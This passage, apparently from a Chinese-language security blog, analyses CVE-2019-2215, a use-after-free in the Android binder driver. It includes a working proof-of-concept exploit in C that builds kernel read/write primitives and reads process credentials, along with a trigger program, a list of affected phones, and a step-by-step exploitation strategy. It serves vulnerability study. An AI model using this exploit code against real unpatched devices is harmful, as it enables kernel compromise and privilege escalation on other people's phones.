class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *buf, <span class="type">unsigned</span> <span class="type">long</span> len)</span> &#123;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">&quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&quot;</span>, len);</span><br><span class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], (<span class="type">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_read failed to read kernel memory&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_read failed to write out to userspace&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">kernel_read_ulong</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> data;</span><br><span class="line">  kernel_read(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write_ulong</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">unsigned</span> <span class="type">long</span> data)</span> &#123;</span><br><span class="line">  kernel_write(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write_uint</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">unsigned</span> <span class="type">int</span> data)</span> &#123;</span><br><span class="line">  kernel_write(kaddr, &amp;data, <span class="keyword">sizeof</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64</span></span><br><span class="line"><span class="comment">// data from `pahole` on my own build with the same .config</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__task_struct__mm 0x520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__task_struct__cred 0x790</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__mm_struct__user_ns 0x300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET__uts_namespace__name__version 0xc7</span></span><br><span class="line"><span class="comment">// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL__init_user_ns 0x202f2c8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL__init_task 0x20257d0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL__init_uts_ns 0x20255c0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Starting POC\n&quot;</span>);</span><br><span class="line">  <span class="comment">//pin_to(0);</span></span><br><span class="line"></span><br><span class="line">  dummy_page_4g_aligned = mmap((<span class="type">void</span>*)<span class="number">0x100000000</span>UL, <span class="number">0x2000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dummy_page_4g_aligned != (<span class="type">void</span>*)<span class="number">0x100000000</span>UL)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;mmap 4g aligned&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pipe(kernel_rw_pipe)) err(<span class="number">1</span>, <span class="string">&quot;kernel_rw_pipe&quot;</span>);</span><br><span class="line"></span><br><span class="line">  binder_fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDONLY); <span class="comment">//s1</span></span><br><span class="line">  epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">  leak_task_struct();</span><br><span class="line">  clobber_addr_limit();</span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;should have stable kernel R/W now\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* in case you want to do stuff with the creds, to show that you can get them: */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current-&gt;mm == 0x%lx\n&quot;</span>, current_mm);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current-&gt;mm-&gt;user_ns == 0x%lx\n&quot;</span>, current_user_ns);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kernel_base = current_user_ns - SYMBOL__init_user_ns;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;kernel base is 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">  <span class="keyword">if</span> (kernel_base &amp; <span class="number">0xfff</span>UL) errx(<span class="number">1</span>, <span class="string">&quot;bad kernel base (not 0x...000)&quot;</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> init_task = kernel_base + SYMBOL__init_task;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&amp;init_task == 0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;init_task.cred == 0x%lx\n&quot;</span>, init_task_cred);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current-&gt;cred == 0x%lx\n&quot;</span>, my_cred);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> init_uts_ns = kernel_base + SYMBOL__init_uts_ns;</span><br><span class="line">  <span class="type">char</span> new_uts_version[] = <span class="string">&quot;EXPLOITED KERNEL&quot;</span>;</span><br><span class="line">  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, <span class="keyword">sizeof</span>(new_uts_version));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>漏洞编号：</strong>CVE-2019-2215</p><p><strong>漏洞危害等级：</strong></p><p><strong>复现&#x2F;利用难易程度：</strong></p><ul><li><p><strong>适用环境：</strong></p><p>  1)Pixel 2 小于 Android 10</p><ol start="2"><li><p>Huawei P20</p></li><li><p>Xiaomi Redmi 5A</p></li><li><p>Xiaomi Redmi Note 5</p></li><li><p>Xiaomi A1</p></li><li><p>Oppo A3</p></li><li><p>Moto Z3</p></li><li><p>Oreo LG phones (run same kernel according to website)</p></li><li><p>Samsung S7, S8, S9</p></li></ol></li></ul><p><strong>漏洞类型：Use-after-Free</strong></p><ul><li><p><strong>触发方式：</strong></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> fd, epfd;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class="line"> fd = open(<span class="string">&quot;/dev/binder&quot;</span>, O_RDONLY);<span class="comment">//创建binder_thread</span></span><br><span class="line"> epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line"> epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);<span class="comment">//初始化binder_thread-&gt;wait_queue_head_t, 调用add_wait_queue插入wait_queue_t到binder_thread.wait中</span></span><br><span class="line"> ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);<span class="comment">//释放binder_thread结构体，程序结束的时会遍历这个链表触发uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>利用条件：</strong></p><p>  使用管道作为泄漏的媒介。攻击策略基本上如下：</p><p>  1.创建管道</p><p>  2.在binder_thread对象上触发free</p><p>  3.在管道上调用writev函数</p><p>  4.触发UAF&#x2F;unlink破坏iovec结构</p><p>  5.在管道上调用read函数，它将使用IOVEC_INDX_FOR_WQ处未被覆写的iovec读取dummy_page</p><p>  数据</p><p>  6.在管道上再次调用read函数，它将使用IOVEC_INDX_FOR_WQ+1处被覆写的iovec读取内核数据</p><p>  在两个单独的线程中处理读取和写入更容易。</p><p>  父线程负责：</p><p>  1.在binder_thread对象上触发free</p><p>  2.在管道上调用writev函数</p><p>  3.(等待子线程)</p><p>  4.在管道上再次调用read函数，它将使用IOVEC_INDX_FOR_WQ+1处被覆写的iovec读取内核数据</p><p>  子线程负责：</p><p>  (接父线程中的第2步)</p><p>  1.触发UAF&#x2F;unlink破坏iovec结构</p><p>  2.在管道上调用read函数，它将使用IOVEC_INDX_FOR_WQ处未被覆写的iovec读取dummy_page数据</p></li></ul><h2 id="成因分析："><a href="#成因分析：" class="headerlink" title="成因分析："></a><strong>成因分析：</strong></h2><h3 id="binder"><a href="#binder" class="headerlink" title="binder"></a><strong>binder</strong></h3><p>binder驱动程序是用于android的驱动程序，它提供了一种简单的IPC(Inter Process Communication，进程间通信)方法，包括RPC(Remote Procedure Calling，远程过程调用)。您可以在linux内核中找到此驱动程序的源代码。binder设备驱动程序可用于不同类型的IPC。例如使用AIDL(Android Interface Definition Language，Android接口定义语言)在framework和应用程序进程之间进行通信可以使用&#x2F;dev&#x2F;binder；使用HIDL(HAL Interface Definition Language，硬件抽象层接口定义语言)在framework和应用程序进程之间进行通信可以使用&#x2F;dev&#x2F;hwbinder。对于在供应商进程之间使用IPC而不使用HIDL的供应商，可以使用&#x2F;dev&#x2F;vndbinder。这里主要利用的是第一个驱动程序&#x2F;dev&#x2F;binder。</p><p>与linux中的大多数IPC机制一样，binder通过文件描述符并使用EPOLL API向其添加epoll。</p><h3 id="vectored-I-x2F-O"><a href="#vectored-I-x2F-O" class="headerlink" title="vectored I&#x2F;O"></a><strong><strong>vectored I&#x2F;O</strong></strong></h3><p>vectored I&#x2F;O允许使用多个缓冲区写入数据流，或将数据流读取到多个缓冲区。也称为scatter&#x2F;gather I&#x2F;O(分散&#x2F;聚集 I&#x2F;O)。与non-vectored I&#x2F;O相比，vectored I&#x2F;O具有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销，属于原子操作。当数据包中有一个头部，后跟连续块中的数据的时候使用vectored I&#x2F;O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用对其进行读取或写入。使用方法是定义一个iovec结构体数组，其中包含有关要用于I&#x2F;O的所有缓冲区的信息。该iovec结构体相对较小，在64位系统上仅包含两个QWORD(8字节数据)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>&#123;</span><span class="comment">// Size: 0x10</span></span><br><span class="line"><span class="type">void</span>*iov_base;<span class="comment">// 0x00</span></span><br><span class="line"><span class="type">size_t</span> iov_len;<span class="comment">// 0x08</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="binder-ioctl"><a href="#binder-ioctl" class="headerlink" title="binder_ioctl"></a>binder_ioctl</h2><p>该漏洞触发的点在ioctl命令BINDER_THREAD_EXIT ，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">binder_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">case</span> BINDER_THREAD_EXIT:</span><br><span class="line">        binder_debug(BINDER_DEBUG_THREADS, <span class="string">&quot;%d:%d exit\n&quot;</span>,</span><br><span class="line">                 proc-&gt;pid, thread-&gt;pid);</span><br><span class="line">        binder_free_thread(proc, thread);</span><br><span class="line">        thread = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">binder_free_thread</span><span class="params">(<span class="keyword">struct</span> binder_proc *proc,</span></span><br><span class="line"><span class="params">                  <span class="keyword">struct</span> binder_thread *thread)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">send_reply</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> active_transactions = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t) &#123;</span><br><span class="line">        active_transactions++;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (send_reply)</span><br><span class="line">        binder_send_failed_reply(send_reply, BR_DEAD_REPLY);</span><br><span class="line">    binder_release_work(&amp;thread-&gt;todo);</span><br><span class="line">    kfree(thread); <span class="comment">// 触发UAF</span></span><br><span class="line">    binder_stats_deleted(BINDER_STAT_THREAD);</span><br><span class="line">    <span class="keyword">return</span> active_transactions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kfree(thread) 是触发UAF漏洞中释放thread的地方。</p><h2 id="ep-unregister-pollwait"><a href="#ep-unregister-pollwait" class="headerlink" title="ep_unregister_pollwait"></a>ep_unregister_pollwait</h2><p>查看源码发现binder_thread对象是间接引用的，被释放的binder_thread在eppoll_entry链表中，即pwq。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ep_unregister_pollwait</span><span class="params">(<span class="keyword">struct</span> eventpoll *ep, <span class="keyword">struct</span> epitem *epi)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lsthead</span> =</span> &amp;epi-&gt;pwqlist;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eppoll_entry</span> *<span class="title">pwq</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!list_empty(lsthead)) &#123;</span><br><span class="line">        pwq = list_first_entry(lsthead, <span class="keyword">struct</span> eppoll_entry, llink);</span><br><span class="line"></span><br><span class="line">        list_del(&amp;pwq-&gt;llink);</span><br><span class="line">        ep_remove_wait_queue(pwq);</span><br><span class="line">        kmem_cache_free(pwq_cache, pwq);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ep-remove-wait-queue"><a href="#ep-remove-wait-queue" class="headerlink" title="ep_remove_wait_queue"></a>ep_remove_wait_queue</h2><p>remove_wait_queue函数的功能就是删除紧随在表头之后的一个成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ep_remove_wait_queue</span><span class="params">(<span class="keyword">struct</span> eppoll_entry *pwq)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> *whead;</span><br><span class="line"></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    whead = smp_load_acquire(&amp;pwq-&gt;whead);</span><br><span class="line">    <span class="keyword">if</span> (whead)</span><br><span class="line">        remove_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_wait_queue</span><span class="params">(<span class="type">wait_queue_head_t</span> *q, <span class="type">wait_queue_t</span> *wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __remove_wait_queue(q, wait);</span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>remove_wait_queue函数中q是waitqueue的表头，指向binder_thread结构体中的wait_queue_head_t(已经被释放)。wait是waitqueue中的成员，紧随在表头之后。结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_proc</span> *<span class="title">proc</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb_node</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">waiting_thread_node</span>;</span></span><br><span class="line">        <span class="type">int</span> pid;</span><br><span class="line">        <span class="type">int</span> looper;              <span class="comment">/* only modified by this thread */</span></span><br><span class="line">        <span class="type">bool</span> looper_need_return; <span class="comment">/* can be written by other thread */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">transaction_stack</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">todo</span>;</span></span><br><span class="line">        <span class="type">bool</span> process_todo;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">return_error</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_error</span> <span class="title">reply_error</span>;</span></span><br><span class="line">        <span class="type">wait_queue_head_t</span> wait;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">binder_stats</span> <span class="title">stats</span>;</span></span><br><span class="line">        <span class="type">atomic_t</span> tmp_ref;</span><br><span class="line">        <span class="type">bool</span> is_dead;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span>              lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> <span class="title">wait_queue_head_t</span>;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以利用链表中的unlink操作来泄露内核数据 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__remove_wait_queue(<span class="type">wait_queue_head_t</span> *head, <span class="type">wait_queue_t</span> *old)</span><br><span class="line">&#123;</span><br><span class="line">    list_del(&amp;old-&gt;task_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_del</span><span class="params">(<span class="keyword">struct</span> list_head *entry)</span></span><br><span class="line">&#123;</span><br><span class="line">    __list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">    entry-&gt;next = LIST_POISON1;</span><br><span class="line">    entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __list_del(<span class="keyword">struct</span> list_head * prev, <span class="keyword">struct</span> list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">    next-&gt;prev = prev; <span class="comment">// unlink</span></span><br><span class="line">    WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>iovec结构体的iov_base指针进行泄露，内核将在处理请求之前首先确保iov_base是一个用户态指针，需要将该指针覆盖成unlink中的prev，当iovec从描述符中读取iov_base指向的数据时，将会读取我们覆盖的指针位置，就可以泄露prev指向处的数据，注意其中包含的地址需要拥有允许任意读取&#x2F;写入以及代码执行的权限。iovec结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">ptr_t</span> iov_base; <span class="comment">/* Starting address */</span></span><br><span class="line">    <span class="type">size_t</span> iov_len; <span class="comment">/* Length in bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果要覆盖这个指针就必须找到binder_thread结构的waitqueue的偏移量，查看使用binder_thread结构的waitqueue可以找到偏移量，当函数binder_wakeup_thread_ilocked调用wake_up_interruptible_sync(&amp;thread-&gt;wait) 时，在调用之前将地址加载到X0寄存器中时会引用偏移量。我们可以看到waitqueue位于binder_thread的偏移0xA0处。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000</span>C0E2B4    ADD    X0, X8, #<span class="number">0xA0</span></span><br><span class="line">.text:<span class="number">0000000000</span>C0E2B8    MOV    W1, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000</span>C0E2BC    MOV    W2, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000</span>C0E2C0    TBZ    W19, #<span class="number">0</span>, loc_C0E2CC</span><br><span class="line">.text:<span class="number">0000000000</span>C0E2C4    BL     __wake_up_sync</span><br></pre></td></tr></table></figure><p>binder_thread结构体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_proc</span> *<span class="title">proc</span>;</span>   <span class="comment">// 线程所属的Binder进程</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb_node</span>;</span>     <span class="comment">// 红黑树节点，关联到红黑树binder_proc-&gt;threads中。</span></span><br><span class="line">    <span class="type">int</span> pid;                    <span class="comment">// 进程id</span></span><br><span class="line">    <span class="type">int</span> looper;                 <span class="comment">// 线程状态。可以取BINDER_LOOPER_STATE_REGISTERED等值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_transaction</span> *<span class="title">transaction_stack</span>;</span>   <span class="comment">// 正在处理的事务栈</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">todo</span>;</span>                          <span class="comment">// 待处理的事务链表</span></span><br><span class="line">    <span class="type">uint32_t</span> return_error; <span class="comment">/* Write failed, return error code in read buf */</span></span><br><span class="line">    <span class="type">uint32_t</span> return_error2; <span class="comment">/* Write failed, return error code in read */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">wait_queue_head_t</span> wait;                         <span class="comment">// 等待队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binder_stats</span> <span class="title">stats</span>;</span>                      <span class="comment">// 保存一些统计信息</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于iovec结构体大小为0x10，这意味着数组中的索引0xA处的iovec将与waitqueue对齐。由于自旋锁只有一个DWORD(4个字节)，并且我们可以传递64位的指针，因此可以将mmap映射低32位为0的用户态地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dummy_page = mmap((<span class="type">void</span> *)<span class="number">0x100000000</span>ul, <span class="number">2</span> * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line"><span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line">iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned;<span class="comment">// 自旋锁必须为0以避免死锁</span></span><br><span 